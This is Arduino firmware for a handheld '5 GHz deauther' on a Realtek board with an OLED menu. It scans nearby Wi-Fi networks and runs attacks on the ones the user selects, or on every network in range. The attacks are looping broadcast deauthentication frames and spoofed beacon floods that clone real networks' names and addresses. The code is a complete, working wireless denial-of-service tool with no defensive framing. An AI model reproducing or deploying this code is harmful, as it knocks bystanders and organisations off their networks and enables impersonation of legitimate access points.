

// Wifi
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// Misc
#undef max
#undef min
#include <SPI.h>
#define SPI_MODE0 0x00
#include "vector"
#include "map"
#include "debug.h"
#include <Wire.h>

// Display
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Pins
#define BTN_DOWN PA14
#define BTN_UP PA30
#define BTN_OK PA12
#define BTN_BACK PA7

// VARIABLES
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];

  short rssi;
  uint channel;
} WiFiScanResult;

// Credentials for you Wifi network
char *ssid = "浪木";
char *pass = "0123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::vector<int> SelectedVector;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint8_t becaon_bssid[6];
uint16_t deauth_reason;
String SelectedSSID;
String SSIDCh;

int attackstate = 0;
int menustate = 0;
bool menuscroll = true;
bool okstate = true;
int scrollindex = 0;
int perdeauth = 3;

// timing variables
unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;
const unsigned long DEBOUNCE_DELAY = 150;

// IMAGES
static const unsigned char PROGMEM image_wifi_not_connected__copy__bits[] = { 0x21, 0xf0, 0x00, 0x16, 0x0c, 0x00, 0x08, 0x03, 0x00, 0x25, 0xf0, 0x80, 0x42, 0x0c, 0x40, 0x89, 0x02, 0x20, 0x10, 0xa1, 0x00, 0x23, 0x58, 0x80, 0x04, 0x24, 0x00, 0x08, 0x52, 0x00, 0x01, 0xa8, 0x00, 0x02, 0x04, 0x00, 0x00, 0x42, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x40, 0x80, 0x00, 0x00, 0x00 };
static const unsigned char PROGMEM image_off_text_bits[] = { 0x67, 0x70, 0x94, 0x40, 0x96, 0x60, 0x94, 0x40, 0x64, 0x40 };
static const unsigned char PROGMEM image_network_not_connected_bits[] = { 0x82, 0x0e, 0x44, 0x0a, 0x28, 0x0a, 0x10, 0x0a, 0x28, 0xea, 0x44, 0xaa, 0x82, 0xaa, 0x00, 0xaa, 0x0e, 0xaa, 0x0a, 0xaa, 0x0a, 0xaa, 0x0a, 0xaa, 0xea, 0xaa, 0xaa, 0xaa, 0xee, 0xee, 0x00, 0x00 };
static const unsigned char PROGMEM image_cross_contour_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x80, 0x51, 0x40, 0x8a, 0x20, 0x44, 0x40, 0x20, 0x80, 0x11, 0x00, 0x20, 0x80, 0x44, 0x40, 0x8a, 0x20, 0x51, 0x40, 0x20, 0x80, 0x00, 0x00, 0x00, 0x00 };

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}
void selectedmenu(String text) {
  display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
  display.println(text);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi Networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" Done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" Failed!\n");
    return 1;
  }
}

bool contains(std::vector<int>& vec,int value){
  for (int v : vec){
    if(v==value){
      return true;
    }
  }
  return false;
}


void addValue(std::vector<int>& vec,int value){
  if(!contains(vec, value)){
    vec.push_back(value);
  } else{
    Serial.print(value);
    Serial.println("Exits");
    for (auto IT = vec.begin(); IT != vec.end();){
      if(*IT == value){
        IT=vec.erase(IT);
      }
      else{
        ++IT;
      }
    }
    Serial.println("De-selected");
  }
}
//uint8_t becaon_bssid[6];
void toggleSelection(int index) {
  bool found = false;
  int foundIndex = -1;
  
  // 查找是否已经选中
  for(size_t i = 0; i < SelectedVector.size(); i++) {
    if(SelectedVector[i] == index) {
      found = true;
      foundIndex = i;
      break;
    }
  }
  
  // 切换选中状态
  if(found) {
    // 删除选中项
    SelectedVector.erase(SelectedVector.begin() + foundIndex);
  } else {
    // 添加新选中项
    SelectedVector.push_back(index);
  }
}

void drawssid() {
  const int MAX_DISPLAY_ITEMS = 4;  // 屏幕可显示的最大项目数
  int startIndex = 0;  // 显示的起始索引
  scrollindex = 0;  // 重置选择索引
  
  // 文本滚动相关变量
  unsigned long lastScrollTime = 0;
  const unsigned long SCROLL_DELAY = 300; // 滚动速度(ms)
  int scrollPosition = 0;
  bool needScroll = false;
  String currentScrollText = "";
  
  while(true) {
    unsigned long currentTime = millis();
    
    // 按钮处理
    if(digitalRead(BTN_OK) == LOW) {
      delay(150);
      if(scrollindex == -1) {  // 选中返回选项
        break;
      } else {
        toggleSelection(scrollindex);
      }
    }
    
    if(digitalRead(BTN_UP) == LOW) {
      delay(150);
      scrollPosition = 0; // 重置滚动位置
      if(scrollindex < static_cast<int>(scan_results.size() - 1)) {
        scrollindex++;
        if(scrollindex - startIndex >= MAX_DISPLAY_ITEMS) {
          startIndex++;
        }
      }
    }
    
    if(digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      scrollPosition = 0; // 重置滚动位置
      if(scrollindex > -1) {
        scrollindex--;
        if(scrollindex < startIndex && startIndex > 0) {
          startIndex--;
        }
      }
    }
    
    // 绘制界面
    display.clearDisplay();
    display.setTextSize(1);
    
    // 绘制返回选项
    display.setCursor(5, 0);
    if(scrollindex == -1) {
      selectedmenu("< BACK >");
    } else {
      display.print("< BACK >");
    }
    
    // 绘制WiFi列表
    for(int i = 0; i < MAX_DISPLAY_ITEMS && (startIndex + i) < static_cast<int>(scan_results.size()); i++) {
      int currentIndex = startIndex + i;
      display.setCursor(5, (i + 1) * 12);
      
      String ssid = scan_results[currentIndex].ssid;
      if(ssid.length() == 0) {
        ssid = "#HIDDEN#";
      }
      
      // 处理当前选中项的文本滚动
      if(currentIndex == scrollindex && ssid.length() > 13) {
        needScroll = true;
        currentScrollText = ssid;
        if(currentTime - lastScrollTime >= SCROLL_DELAY) {
          lastScrollTime = currentTime;
          scrollPosition++;
          if(scrollPosition > ssid.length()) {
            scrollPosition = 0;
          }
        }
        // 创建滚动文本
        String displayText = ssid.substring(scrollPosition);
        if(displayText.length() > 13) {
          displayText = displayText.substring(0, 13);
        }
        ssid = displayText;
      } else {
        if(ssid.length() > 13) {
          ssid = ssid.substring(0, 10) + "...";
        }
      }
      
      // 高亮当前选中项
      if(currentIndex == scrollindex) {
        display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
      } else {
        display.setTextColor(SSD1306_WHITE);
      }
      
      // 显示WiFi信息
      display.print(ssid);
      display.print(" ");
      display.print(scan_results[currentIndex].channel >= 36 ? "5G" : "2.4G");
      
      // 显示选中状态
      display.setCursor(105, (i + 1) * 12);
      bool isSelected = false;
      for(int selectedIdx : SelectedVector) {
        if(selectedIdx == currentIndex) {
          isSelected = true;
          break;
        }
      }
      display.print(isSelected ? "[*]" : "[ ]");
      
      // 恢复默认文本颜色
      display.setTextColor(SSD1306_WHITE);
    }
    
    display.display();
  }
}
void drawscan() {
  while (true) {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);
    display.print("Scanning..(3~5s)");
    display.display();
    if (scanNetworks() != 0) {
      while (true) delay(1000);
    }
    Serial.print("Done");
    display.clearDisplay();
    display.setCursor(5, 25);
    display.print("Done");
    display.display();
    delay(300);
    break;
  }
}
void Single() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Single Attack...");
  display.display();
  
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    
    // 如果没有选中的WiFi，使用当前scrollindex
    if (SelectedVector.empty()) {
      memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
      
      deauth_reason = 1;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      deauth_reason = 4;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      deauth_reason = 16;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    } 
    // 攻击所有选中的WiFi
    else {
      for (int selectedIndex : SelectedVector) {
        if (selectedIndex >= 0 && selectedIndex < scan_results.size()) {
          memcpy(deauth_bssid, scan_results[selectedIndex].bssid, 6);
          wext_set_channel(WLAN0_NAME, scan_results[selectedIndex].channel);
          
          for (int x = 0; x < perdeauth; x++) {
            deauth_reason = 1;
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            deauth_reason = 4;
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            deauth_reason = 16;
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
          }
        }
      }
    }
  }
}
void All() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Attacking All...");
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < perdeauth; x++) {
        deauth_reason = 1;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 4;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 16;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      }
    }
  }
}
void BecaonDeauth() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Becaon+Deauth Attack...");
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      String ssid1 = scan_results[i].ssid;
      const char *ssid1_cstr = ssid1.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 0);
      }
    }
  }
}
void Becaon() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Becaon Attack...");
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      String ssid1 = scan_results[i].ssid;
      const char *ssid1_cstr = ssid1.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
      }
    }
  }
}
void drawattack() {
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(150);
      if (attackstate == 0) {
        Single();
        break;
      }
      if (attackstate == 1) {
        All();
        break;
      }
      if (attackstate == 2) {
        Becaon();
        break;
      }
      if (attackstate == 3) {
        BecaonDeauth();
        break;
      }
      if (attackstate == 4) {
        break;
      }
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(120);
      if (attackstate > 0) {
        attackstate--;
      }
    }
    if (digitalRead(BTN_UP) == LOW) {
      delay(120);
      if (attackstate < 4) {
        attackstate++;
      }
    }
    if (attackstate == 0) {
      delay(50);
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(5, 5);
      selectedmenu("Single Deauth Attack");
      display.setCursor(5, 15);
      display.println("ALL Deauth Attack");
      display.setCursor(5, 25);
      display.println("Becaon Attack");
      display.setCursor(5, 35);
      display.println("Becaon&Deauth Attack");
      display.setCursor(5, 45);
      display.println("< Back >");
      display.display();
    }
    if (attackstate == 1) {
      delay(50);
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(5, 5);
      display.println("Single Deauth Attack");
      display.setCursor(5, 15);
      selectedmenu("All Deauth Attack");
      display.setCursor(5, 25);
      display.println("Becaon Attack");
      display.setCursor(5, 35);
      display.println("Becaon&Deauth Attack");
      display.setCursor(5, 45);
      display.println("< Back >");
      display.display();
    }
    if (attackstate == 2) {
      delay(50);
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(5, 5);
      display.println("Single Deauth Attack");
      display.setCursor(5, 15);
      display.println("All Deauth Attack");
      display.setCursor(5, 25);
      selectedmenu("Becaon Attack");
      display.setCursor(5, 35);
      display.println("Becaon&Deauth Attack");
      display.setCursor(5, 45);
      display.println("< Back >");
      display.display();
    }
    if (attackstate == 3) {
      delay(50);
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(5, 5);
      display.println("Single Deauth Attack");
      display.setCursor(5, 15);
      display.println("All Deauth Attack");
      display.setCursor(5, 25);
      display.println("Becaon Attack");
      display.setCursor(5, 35);
      selectedmenu("Becaon&Deauth Attack");
      display.setCursor(5, 45);
      display.println("< Back >");
      display.display();
    }
    if (attackstate == 4) {
      delay(50);
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(5, 5);
      display.println("Single Deauth Attack");
      display.setCursor(5, 15);
      display.println("All Deauth Attack");
      display.setCursor(5, 25);
      display.println("Becaon Attack");
      display.setCursor(5, 35);
      display.println("Becaon&Deauth Attack");
      display.setCursor(5, 45);
      selectedmenu("< Back >");
      display.display();
    }
  }
}

void titleScreen(void) {
  display.clearDisplay();
  display.setTextWrap(false);
  display.setTextSize(1);       // Set text size to normal
  display.setTextColor(WHITE);  // Set text color to white
  display.setCursor(6, 7);
  display.print("  by langmu");
  display.setCursor(24, 48);
  //display.setFont(&Org_01);
  display.print("5 G H Z");
  //display.setFont(&Org_01);
  display.setCursor(4, 55);
  display.print("d e a u t h e r");
  display.drawBitmap(1, 20, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(112, 35, image_off_text_bits, 12, 5, 1);
  display.drawBitmap(45, 19, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(68, 13, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(24, 34, image_off_text_bits, 12, 5, 1);
  display.drawBitmap(106, 14, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(109, 48, image_network_not_connected_bits, 15, 16, 1);
  //display.setFont(&Org_01);
  display.drawBitmap(88, 25, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(24, 14, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(9, 35, image_cross_contour_bits, 11, 16, 1);
  display.display();
  delay(2000);
}
void setup() {
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  Serial.begin(115200);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true)
      ;
  }
  titleScreen();
  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks() != 0) {
    while (true) delay(1000);
  }

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif
  SelectedSSID = scan_results[0].ssid;
  SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";
}

void loop() {
  unsigned long currentTime = millis();
  if (menustate == 0) {
    delay(50);
    display.clearDisplay();
    display.setTextSize(1.7);
    display.setCursor(5, 10);
    selectedmenu("Attack");
    display.setCursor(5, 25);
    display.println("Scan");
    display.setCursor(5, 40);
    display.println("Select");
    display.display();
  }
  if (menustate == 1) {
    delay(50);
    display.clearDisplay();
    display.setTextSize(1.7);
    display.setCursor(5, 10);
    display.println("Attack");
    display.setCursor(5, 25);
    selectedmenu("Scan");
    display.setCursor(5, 40);
    display.println("Select");
    display.display();
  }
  if (menustate == 2) {
    delay(50);
    display.clearDisplay();
    display.setTextSize(1.7);
    display.setCursor(5, 10);
    display.println("Attack");
    display.setCursor(5, 25);
    display.println("Scan");
    display.setCursor(5, 40);
    selectedmenu("Select");
    display.display();
  }
  if (digitalRead(BTN_OK) == LOW) {
    delay(150);
    if (okstate) {
      if (menustate == 0) {
        drawattack();
      }
      if (menustate == 1) {
        drawscan();
      }
      if (menustate == 2) {
        drawssid();
      }
    }
  }
  if (digitalRead(BTN_DOWN) == LOW) {
    if (currentTime - lastDownTime > DEBOUNCE_DELAY) {
      if (menustate > 0) {
        menustate--;
      }
      lastDownTime = currentTime;
    }
  }
  // Up Button
  if (digitalRead(BTN_UP) == LOW) {
    if (currentTime - lastUpTime > DEBOUNCE_DELAY) {
      if (menustate < 2) {
        menustate++;
      }
      lastUpTime = currentTime;
    }
  }
}
